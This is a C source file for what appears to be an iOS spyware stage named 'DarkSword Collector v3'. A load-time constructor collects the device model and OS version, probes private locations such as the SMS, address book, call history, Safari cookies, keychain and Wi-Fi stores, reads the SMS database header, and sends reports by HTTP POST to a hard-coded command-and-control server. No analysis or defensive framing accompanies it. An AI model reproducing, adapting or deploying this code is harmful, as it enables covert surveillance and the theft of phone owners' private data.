/**
 * DarkSword Collector v3 - No SDK headers
 * Directly declares libsystem functions, no cross-compile issues
 */

/* Basic types */
typedef unsigned long size_t;
typedef int ssize_t;
typedef int mode_t;
typedef long off_t;

#define NULL ((void*)0)
#define O_RDONLY 0
#define AF_INET 2
#define SOCK_STREAM 1
#define SOL_SOCKET 1
#define SO_RCVTIMEO 20
#define SO_SNDTIMEO 21

struct sockaddr_in {
    short sin_family;
    unsigned short sin_port;
    unsigned int sin_addr;
    char sin_zero[8];
};

struct timeval {
    long tv_sec;
    long tv_usec;
};

struct dirent {
    unsigned long long d_ino;
    unsigned long long d_seekoff;
    unsigned short d_reclen;
    unsigned short d_namlen;
    unsigned char d_type;
    char d_name[1024];
};

/* External function declarations */
extern int open(const char*, int, ...);
extern int close(int);
extern ssize_t read(int, void*, size_t);
extern int socket(int, int, int);
extern int connect(int, const struct sockaddr*, unsigned int);
extern ssize_t send(int, const void*, size_t, int);
extern ssize_t recv(int, void*, size_t, int);
extern int setsockopt(int, int, int, const void*, unsigned int);
extern unsigned int inet_addr(const char*);
extern unsigned short htons(unsigned short);
extern void* memset(void*, int, size_t);
extern size_t strlen(const char*);
extern char* strcpy(char*, const char*);
extern char* strncpy(char*, const char*, size_t);
extern int strcmp(const char*, const char*);
extern int strncmp(const char*, const char*, size_t);
extern int atoi(const char*);
extern int snprintf(char*, size_t, const char*, ...);
extern int sysctlbyname(const char*, void*, size_t*, void*, size_t);

/* Directory functions */
typedef struct {
    int fd;
    struct dirent entry;
    struct dirent* result;
} DIR;

extern DIR* opendir(const char*);
extern struct dirent* readdir(DIR*);
extern int closedir(DIR*);

/* Socket address conversion */
extern int inet_pton(int, const char*, void*);

/* Config */
#define C2_HOST "192.168.110.111"
#define C2_PORT 8081
#define BUF_SIZE 65536

/* Helper: int to string */
static int int_to_str(int val, char* buf) {
    char tmp[16];
    int i = 0, neg = 0;
    if (val < 0) { neg = 1; val = -val; }
    if (val == 0) { buf[0] = '0'; buf[1] = 0; return 1; }
    while (val > 0) { tmp[i++] = '0' + (val % 10); val /= 10; }
    int pos = 0;
    if (neg) buf[pos++] = '-';
    while (i > 0) buf[pos++] = tmp[--i];
    buf[pos] = 0;
    return pos;
}

/* Entry point */
__attribute__((constructor))
static void _process(void) {
    char buf[BUF_SIZE];
    char result[BUF_SIZE];
    char machine[64] = {0};
    char osversion[64] = {0};
    size_t len;
    int pos = 0;

    /* Get device info via sysctl */
    len = sizeof(machine);
    sysctlbyname("hw.machine", machine, &len, NULL, 0);
    len = sizeof(osversion);
    sysctlbyname("kern.osversion", osversion, &len, NULL, 0);

    /* Build JSON */
    pos = 0;
    pos += snprintf(result + pos, BUF_SIZE - pos,
        "{\"machine\":\"%s\",\"osversion\":\"%s\",\"accessible\":[",
        machine, osversion);

    /* Check accessible paths */
    const char* paths[] = {
        "/var/mobile/Library/SMS/",
        "/var/mobile/Library/AddressBook/",
        "/var/mobile/Library/CallHistoryDB/",
        "/var/mobile/Library/Preferences/",
        "/var/mobile/Library/Safari/",
        "/var/mobile/Library/Cookies/",
        "/var/Keychains/",
        "/var/mobile/Library/WiFiNetworkStore/",
        NULL
    };

    int first = 1;
    for (int i = 0; paths[i]; i++) {
        DIR* d = opendir(paths[i]);
        if (d) {
            closedir(d);
            if (!first) result[pos++] = ',';
            result[pos++] = '"';
            int j = 0;
            while (paths[i][j]) result[pos++] = paths[i][j++];
            result[pos++] = '"';
            first = 0;
        }
    }
    pos += snprintf(result + pos, BUF_SIZE - pos, "]}");

    /* Send via HTTP POST */
    char request[BUF_SIZE + 512];
    int rlen = snprintf(request, sizeof(request),
        "POST /api/v1/c2/report HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n"
        "{\"deviceId\":\"cf_v3\",\"reportType\":\"device_info\",\"data\":%s}",
        C2_HOST, C2_PORT, pos + 60, result);

    /* Connect and send */
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock >= 0) {
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = 2; /* AF_INET */
        addr.sin_port = htons(C2_PORT);
        addr.sin_addr = inet_addr(C2_HOST);

        if (connect(sock, (struct sockaddr*)&addr, 16) >= 0) {
            send(sock, request, rlen, 0);

            /* Read response */
            char resp[4096];
            ssize_t n = recv(sock, resp, sizeof(resp) - 1, 0);
            if (n > 0) resp[n] = 0;
        }
        close(sock);
    }

    /* Also try to read SMS database */
    int fd = open("/var/mobile/Library/SMS/sms.db", O_RDONLY);
    if (fd >= 0) {
        char dbheader[64];
        ssize_t n = read(fd, dbheader, 64);
        close(fd);

        if (n > 0) {
            /* Send SMS access report */
            rlen = snprintf(request, sizeof(request),
                "POST /api/v1/c2/report HTTP/1.1\r\n"
                "Host: %s:%d\r\n"
                "Content-Type: application/json\r\n"
                "Content-Length: 75\r\n"
                "Connection: close\r\n"
                "\r\n"
                "{\"deviceId\":\"cf_v3\",\"reportType\":\"sms\",\"data\":{\"status\":\"accessible\"}}",
                C2_HOST, C2_PORT);

            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock >= 0) {
                struct timeval tv;
                tv.tv_sec = 5;
                tv.tv_usec = 0;
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

                struct sockaddr_in addr;
                memset(&addr, 0, sizeof(addr));
                addr.sin_family = 2;
                addr.sin_port = htons(C2_PORT);
                addr.sin_addr = inet_addr(C2_HOST);

                if (connect(sock, (struct sockaddr*)&addr, 16) >= 0) {
                    send(sock, request, rlen, 0);
                    char resp[4096];
                    recv(sock, resp, sizeof(resp) - 1, 0);
                }
                close(sock);
            }
        }
    }
}
